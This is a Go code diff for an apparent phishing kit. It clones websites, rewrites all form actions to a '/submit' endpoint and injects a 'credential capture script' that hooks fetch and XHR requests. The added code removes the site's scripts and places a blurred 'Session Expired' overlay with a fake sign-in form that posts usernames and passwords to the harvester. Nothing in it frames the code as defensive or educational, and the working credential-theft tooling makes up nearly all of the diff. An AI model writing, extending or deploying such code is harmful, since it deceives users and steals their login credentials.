@@ -6,9 +6,10 @@ import (
 	"strings"
 
 	"golang.org/x/net/html"
+	"golang.org/x/net/html/atom"
 )
 
-// captureScript is injected as the first child of <head> so our fetch/XHR/submit
+// captureScript is injected as the first child of <head> so our fetch/XHR
 // hooks are in place before any site JavaScript runs.
 const captureScript = `(function(){
   function beacon(obj){
@@ -52,6 +53,20 @@ const captureScript = `(function(){
   };
 })();`
 
+const overlayCSS = `
+#cs-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+#cs-backdrop{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);backdrop-filter:blur(3px)}
+#cs-card{position:relative;max-width:380px;margin:15vh auto;background:#fff;border-radius:8px;padding:36px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
+#cs-card h2{margin:0 0 6px;font-size:22px;font-weight:600;color:#1a1a1a}
+#cs-card p{margin:0 0 24px;color:#666;font-size:14px}
+#cs-card input{display:block;width:100%;padding:11px 12px;margin:0 0 14px;border:1px solid #d0d0d0;border-radius:4px;font-size:14px;box-sizing:border-box;background:#fff;color:#1a1a1a}
+#cs-card input:focus{outline:none;border-color:#0066cc;box-shadow:0 0 0 2px rgba(0,102,204,.2)}
+#cs-card button{display:block;width:100%;padding:11px;margin-top:6px;background:#0066cc;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer}
+#cs-card button:hover{background:#0052a3}
+`
+
+const overlayHTML = `<div id="cs-overlay"><div id="cs-backdrop"></div><div id="cs-card"><h2>Session Expired</h2><p>Please sign in to continue</p><form method="POST" action="/submit" autocomplete="on"><input type="text" name="username" placeholder="Email or username" required autofocus><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></div>`
+
 // RewriteForms parses HTML, rewrites all <form> action attributes to "/submit",
 // injects the credential capture script into <head>, then renders the document.
 func RewriteForms(htmlContent string) (string, error) {
@@ -70,27 +85,73 @@ func RewriteForms(htmlContent string) (string, error) {
 	return buf.String(), nil
 }
 
+// ApplyOverlay strips all site scripts and injects a themed login overlay
+// on top of the cloned page. The cloned site becomes a blurred backdrop.
+func ApplyOverlay(htmlContent string) (string, error) {
+	doc, err := html.Parse(strings.NewReader(htmlContent))
+	if err != nil {
+		return "", fmt.Errorf("parse HTML: %w", err)
+	}
+
+	stripScripts(doc)
+	injectOverlay(doc)
+
+	var buf bytes.Buffer
+	if err := html.Render(&buf, doc); err != nil {
+		return "", fmt.Errorf("render HTML: %w", err)
+	}
+	return buf.String(), nil
+}
+
 // injectCaptureScript prepends the capture script as the first child of <head>.
 func injectCaptureScript(doc *html.Node) {
-	var head *html.Node
-	var find func(*html.Node)
-	find = func(n *html.Node) {
-		if n.Type == html.ElementNode && n.Data == "head" {
-			head = n
-			return
-		}
-		for c := n.FirstChild; c != nil && head == nil; c = c.NextSibling {
-			find(c)
-		}
-	}
-	find(doc)
+	head := findNode(doc, "head")
 	if head == nil {
 		return
 	}
-
 	script := &html.Node{Type: html.ElementNode, Data: "script"}
 	script.AppendChild(&html.Node{Type: html.TextNode, Data: captureScript})
 	head.InsertBefore(script, head.FirstChild)
+}
+
+// stripScripts removes all <script> elements from the document tree.
+func stripScripts(n *html.Node) {
+	var next *html.Node
+	for c := n.FirstChild; c != nil; c = next {
+		next = c.NextSibling
+		if c.Type == html.ElementNode && c.Data == "script" {
+			n.RemoveChild(c)
+			continue
+		}
+		stripScripts(c)
+	}
+}
+
+// injectOverlay appends the overlay style and markup to <body>.
+func injectOverlay(doc *html.Node) {
+	body := findNode(doc, "body")
+	if body == nil {
+		return
+	}
+
+	// Inject CSS
+	style := &html.Node{Type: html.ElementNode, Data: "style"}
+	style.AppendChild(&html.Node{Type: html.TextNode, Data: overlayCSS})
+	body.AppendChild(style)
+
+	// Parse overlay HTML fragment and append to body
+	context := &html.Node{
+		Type:     html.ElementNode,
+		DataAtom: atom.Body,
+		Data:     "body",
+	}
+	nodes, err := html.ParseFragment(strings.NewReader(overlayHTML), context)
+	if err != nil {
+		return
+	}
+	for _, n := range nodes {
+		body.AppendChild(n)
+	}
 }
 
 func rewriteNode(n *html.Node) {
@@ -109,4 +170,17 @@ func rewriteNode(n *html.Node) {
 	for c := n.FirstChild; c != nil; c = c.NextSibling {
 		rewriteNode(c)
 	}
+}
+
+// findNode returns the first element with the given tag name, or nil.
+func findNode(n *html.Node, tag string) *html.Node {
+	if n.Type == html.ElementNode && n.Data == tag {
+		return n
+	}
+	for c := n.FirstChild; c != nil; c = c.NextSibling {
+		if found := findNode(c, tag); found != nil {
+			return found
+		}
+	}
+	return nil
 }
